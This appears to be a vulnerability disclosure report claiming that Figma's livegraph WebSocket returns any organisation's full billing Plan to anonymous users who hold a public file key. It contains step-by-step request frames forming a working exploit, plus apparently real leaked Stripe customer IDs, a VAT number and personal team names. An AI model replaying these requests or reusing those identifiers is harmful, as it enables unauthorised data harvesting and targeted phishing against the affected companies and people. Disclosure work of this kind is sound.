# 匿名访问 livegraph PlanByFileKey 视图泄露任意组织完整计费 Plan(stripeCustomerId 等)

title: Figma livegraph unauthenticated PlanByFileKey leaks full billing Plan (stripeCustomerId) for any org with a public file
Asset: wss://www.figma.com/api/livegraph (https://www.figma.com)
Severity: HIGH
Weakness: CWE-639 (Authorization Bypass Through User-Controlled Key) / CWE-200 (Exposure of Sensitive Information)

## Summary

The Figma livegraph WebSocket endpoint (`wss://www.figma.com/api/livegraph`) accepts **anonymous** subscriptions (no session cookie, `userId: null`, `anonymousUserId: null`). The `PlanByFileKey` view accepts any file key and returns the full `Plan` object of the **organization/team that owns the file** — including `stripeCustomerId`, `vatGstId` (**real VAT number**), `taxIdVerificationStatus`, `planRecordId`, team/org name, tier, student team state, upgrade approval settings and a large set of internal feature toggles.

Verified against a **paid pro team (Themesberg/Flowbite)**: `stripeCustomerId: "cus_J1xwCSokJo6SMU"`, `vatGstId: "RO42244256"`, `taxIdVerificationStatus: "verified"` — full billing + tax identity of a real paying company, anonymously.

The only authorization check is "can the requester read the file" (file-level). There is **no separate authorization check on the Plan layer**: any file that is publicly readable (public link, community file, or file indexed by search engines) exposes the owning organization's complete billing configuration to unauthenticated attackers. Same-plan authorization exists elsewhere: `PlanByOrgId`/`PlanByTeamId` views deny anonymous access — only `PlanByFileKey` is mis-scoped to file readability.

The file key needed is trivially obtainable: public Figma files are indexed by Google/community pages/forums (e.g. `figma.com/file/{key}/...`).

## Steps To Reproduce

1. Obtain any public Figma file key, e.g. `CYs4jJGyYeUxpAVcJ2EAZ4` (Material 3 Design Kit, publicly linked on multiple sites) or `bv2nMIdFf4u3dESGail4sm`.

2. Connect anonymously to the livegraph WebSocket (no cookies, `userId: null`):

```
wss://www.figma.com/api/livegraph?pv=1&pr=251c5be83e6853e5&pt=1786072093&ph=sb9dUg8LQV0WGY29b-j8nggmhGX8TR2vghWs-rNzbds&userId=&anonUserId=&clientType=web&commitHash=5848603c50c1ee154ea6a1fe5ee3aab3791c5b48&preload=%7B%7D&requestedProtocolVersion=2&clientUrl=https%3A%2F%2Fwww.figma.com%2Ffile%2FCYs4jJGyYeUxpAVcJ2EAZ4&connectionType=initial&reconnect=0
```

3. Send anonymous auth frame:

```json
{"messageType":"auth","clientType":"web","args":{"userId":null,"anonymousUserId":null},"tags":{"clientType":"web","commitHash":"81855c2bc7c604648169c4e4333f43579bfa7464","clientUrl":"https://www.figma.com/file/CYs4jJGyYeUxpAVcJ2EAZ4"},"clientRequestedVersion":2}
```

4. Subscribe to `PlanByFileKey`:

```json
{"messageType":"subscribe","viewName":"PlanByFileKey","viewHash":"abababababababababababababababab","loadType":"initial","args":{"fileKey":"CYs4jJGyYeUxpAVcJ2EAZ4"}}
```

5. The server returns the full Plan of the owning team (paid pro team example, abridged):

```json
{"fieldName":"plan","value":{
  "id":"team::947922137358580288",
  "type":"team",
  "tier":"pro",
  "stripeCustomerId":"cus_J1xwCSokJo6SMU",
  "vatGstId":"RO42244256",
  "taxIdVerificationStatus":"verified",
  "name":"Themesberg Team",
  "studentTeamState":"not_student_team",
  "planRecordId":"3fc8b88e-5cb5-4f50-9034-2f341d43ed12",
  "aiFeaturesEnabled":true,"aiDataSharingEnabled":true,
  "upgradeApprovalSettingsExpert":"instant_approval_if_available_seats",
  "upgradeApprovalSettingsDeveloper":"instant_approval_if_available_seats",
  "upgradeApprovalSettingsCollaborator":"instant_approval_if_available_seats",
  "upgradeApprovalSettingsContent":"instant_approval_if_available_seats",
  "key":{"parentId":"947922137358580288","type":"team"}
}}
```

## Supporting Material/References

Verified against **11 public files** — all returned the full Plan anonymously:

| Public file key | Leaked Plan |
|---|---|
| `ucha7bf05fJ81CJZVoruo0` (Flowbite Design System Pro) | team::947922137358580288 "Themesberg Team", **pro**, **stripeCustomerId: cus_J1xwCSokJo6SMU**, **vatGstId: RO42244256**, **taxIdVerificationStatus: verified**, planRecordId 3fc8b88e-… |
| `CYs4jJGyYeUxpAVcJ2EAZ4` (M3 Design Kit) | team::724875287175278511 "Team chi", starter, **stripeCustomerId: cus_IlEm1OntcEC6uH**, planRecordId 792d795d-… |
| `bv2nMIdFf4u3dESGail4sm` | organization::1484997479016537761 "Figma Demo Org", **enterprise**, planRecordId 8c2cd314-…, PlanSubscription {id ca35e9e6-…, status "incomplete", createdAt 2025-03-25} |
| `vU5NGHCW6Wc42ojtcAsaik` | team::1342613656850409659 "muneeb client", planRecordId 906146d8-… |
| `vtTXyIEof8A3ATUvtvUGVm` | team::719152616611500478 "Let's Change", planRecordId 019b4633-… |
| `KaKIakOIfbwGangSQknMGn` | team::1284837764813071781 "Divyang Chaudhary's team", planRecordId 638d02a1-… |
| `QDKl0fwEtUUZsaeVwfquBr` | team::1561477094343212805 "Muhammad's Starter team", planRecordId 5a79520c-… |
| `kbKhOEtojLYuCxVM7vDhpX` | team::1109549061106124302 "alon zeevy", planRecordId 17402b63-… |
| `NZicFoZQKbFQlE4Kg8D7N9` | team::1330118218948541721 "Liam Collins's team", planRecordId 7d85bc9d-… |
| `VRTXP8mnIln1FGL2RjkTSD` | team::1071031152797182000 "Super Goyani's team", planRecordId 0c3b9d88-… |
| `W8GEdfgjJaZ21YbP4exVxr` | team::1302483498091091379 "Xosé Lustres's team", planRecordId 23fdf859-… |

Control cases (proving the check is file-read based, not Plan based):
- Private file `cQBfbmMrjx4WNnpCt79xwM` → empty response (denied)
- Invalid file key → empty response

Full raw frames: see `flowbite_plan_full.txt` and `m3_plan_full.txt` (attached).

## Impact

- **Unauthenticated disclosure of billing & tax identity of paying companies**: `stripeCustomerId` (Stripe customer ID — usable for targeted phishing/social engineering and cross-referencing with leaked databases), **`vatGstId` (real EU VAT number, e.g. RO42244256)** and **`taxIdVerificationStatus` (verified)** — demonstrated against a real paid pro team (Themesberg/Flowbite).
- **Internal organization configuration disclosure**: plan tier, student team status, upgrade-approval policies for 4 roles, AI feature toggles, plugin/widget whitelist enforcement, public plugin allowance, template picker settings — competitive intelligence for any org with a public file.
- **Org subscription metadata**: PlanSubscription ID, status, creation timestamp (Org plans).
- **Authorization model inconsistency** proves it is a bug, not intended behavior: the same Plan data is denied anonymously via `PlanByOrgId`/`PlanByTeamId`, but returned via `PlanByFileKey` when the file is readable.
- Scale: any file with "anyone with link can view" or community/embedded public visibility; file keys are widely indexed and shared publicly (Google, design blogs, forums).
